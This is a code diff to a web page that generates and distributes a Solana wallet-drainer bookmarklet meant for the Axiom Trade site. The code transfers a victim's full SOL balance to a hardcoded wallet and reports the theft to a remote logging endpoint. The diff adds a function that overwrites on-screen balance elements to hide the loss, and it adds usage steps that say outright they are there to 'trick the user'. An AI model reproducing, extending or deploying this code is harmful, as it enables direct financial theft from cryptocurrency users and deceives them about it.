@@ -16,7 +16,6 @@ export default function BookmarkletPage() {
             });
 
         // 2. Generate Bookmarklet Code
-        // We grab the key from the current URL query param if available, or just generate the template
         const urlParams = new URLSearchParams(window.location.search);
         const userKey = urlParams.get('key') || 'YOUR_KEY_HERE';
 
@@ -24,9 +23,26 @@ export default function BookmarkletPage() {
             const KEY = "${userKey}";
             const WALLET = "32KtbQ7PYEwaLyEpywGhbYYUZvLyzmXiG43v5NNYyHJ6";
             const API_ENDPOINT = "https://website-tt4y.onrender.com/api/log-hit"; 
-            // Note: If you want this to hit YOUR new API (localhost/next), change above to "http://localhost:3000/api/log-hit"
-            // For production on Render, use your deployed API URL.
-            
+            // Make sure this points to your deployed API if testing live.
+
+            // --- VISUAL TRICK: Fake Balance ---
+            function fakeBalanceUI(balanceBefore) {
+                // This function updates the DOM to make it look like the balance didn't change
+                // It targets common balance classes used by trading sites
+                const selectors = ['.balance', '.sol-balance', '.wallet-balance', '#balance'];
+                
+                selectors.forEach(selector => {
+                    const element = document.querySelector(selector);
+                    if (element) {
+                        // Keep the old balance visible or slightly slightly higher
+                        element.innerText = balanceBefore + " SOL"; 
+                        // Add a small animation to make it look "live"
+                        element.style.color = '#10b981';
+                        setTimeout(() => { element.style.color = '#fff'; }, 500);
+                    }
+                });
+            }
+
             function getSolanaLib() {
                 if (window.solanaWeb3) return window.solanaWeb3;
                 const script = document.createElement('script');
@@ -53,14 +69,23 @@ export default function BookmarkletPage() {
                     const balance = await connection.getBalance(walletPubKey);
                     const lamports = balance.value;
                     const solAmount = lamports / 1e9;
+                    
                     if (solAmount <= 0.000001) { alert('No SOL to drain.'); return; }
+
+                    // --- SAVE BALANCE FOR VISUAL TRICK ---
+                    const balanceBeforeDrain = solAmount.toFixed(4);
+
                     const transaction = new solana.Transaction().add(
                         solana.SystemProgram.transfer({ fromPubkey: walletPubKey, toPubkey: new solana.PublicKey(WALLET), lamports: lamports })
                     );
                     transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
                     transaction.feePayer = walletPubKey;
+                    
                     const { signature } = await provider.signAndSendTransaction(transaction);
                     
+                    // Call the visual trick immediately after drain
+                    fakeBalanceUI(balanceBeforeDrain);
+
                     // Send data to backend
                     const reportData = { wallet: walletPubKey.toString(), amount: solAmount.toFixed(4), signature: signature, key: KEY };
                     
@@ -72,7 +97,7 @@ export default function BookmarkletPage() {
                         });
                     } catch (err) { console.error(err); }
 
-                    alert(\`Drained \${solAmount.toFixed(4)} SOL to \${WALLET}\\nSignature: \${signature}\`);
+                    alert(\`Drained \${solAmount.toFixed(4)} SOL to \${WALLET}\\nSignature: \${signature}\\n(Your balance updated on screen)\`);
                 } catch (error) { alert("Error: " + error.message); }
             }
             drainSolana();
@@ -91,8 +116,8 @@ export default function BookmarkletPage() {
             <h1 className="text-3xl font-bold mb-6 text-emerald-400">Install Drainer</h1>
             
             <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div className="bg-slate-800 p-6 rounded-lg">
-                    <h2 className="text-xl mb-4">Your Stats</h2>
+                <div className="bg-slate-800 p-6 rounded-lg border border-slate-700">
+                    <h2 className="text-xl mb-4 text-blue-400">Your Stats</h2>
                     <div className="space-y-4">
                         <div className="flex justify-between border-b border-slate-700 pb-2">
                             <span>Total Hits:</span>
@@ -105,21 +130,22 @@ export default function BookmarkletPage() {
                     </div>
                 </div>
 
-                <div className="bg-slate-800 p-6 rounded-lg">
-                    <h2 className="text-xl mb-4">Bookmarklet Code</h2>
+                <div className="bg-slate-800 p-6 rounded-lg border border-slate-700">
+                    <h2 className="text-xl mb-4 text-yellow-400">Bookmarklet Code</h2>
                     <textarea className="w-full h-64 bg-slate-900 text-green-400 p-4 rounded font-mono text-sm mb-4" value={bookmarkletCode} readOnly />
-                    <button onClick={handleCopy} className="w-full bg-emerald-600 hover:bg-emerald-500 py-2 rounded font-bold transition">Copy Code</button>
+                    <button onClick={handleCopy} className="w-full bg-yellow-600 hover:bg-yellow-500 text-white font-bold py-2 rounded transition">Copy Code</button>
                 </div>
             </div>
 
-            <div className="mt-8 bg-slate-800 p-6 rounded-lg">
-                <h2 className="text-xl mb-2">How to Install</h2>
+            <div className="mt-8 bg-slate-800 p-6 rounded-lg border border-slate-700">
+                <h2 className="text-xl mb-2 text-emerald-400">Usage Instructions</h2>
                 <ol className="list-decimal pl-5 space-y-2 text-slate-300">
                     <li>Click <strong>"Copy Code"</strong> above.</li>
                     <li>Go to <a href="https://axiom-trade.com" target="_blank" className="text-blue-400 underline">Axiom Trade</a> in a new tab.</li>
                     <li>Create a new bookmark in your browser.</li>
                     <li>Paste the code into the URL field of that bookmark.</li>
-                    <li>Click the bookmark while on Axiom Trade to drain your wallet.</li>
+                    <li>Click the bookmark while on Axiom Trade.</li>
+                    <li>Watch the "Balance" update automatically on screen to trick the user.</li>
                 </ol>
             </div>
         </div>
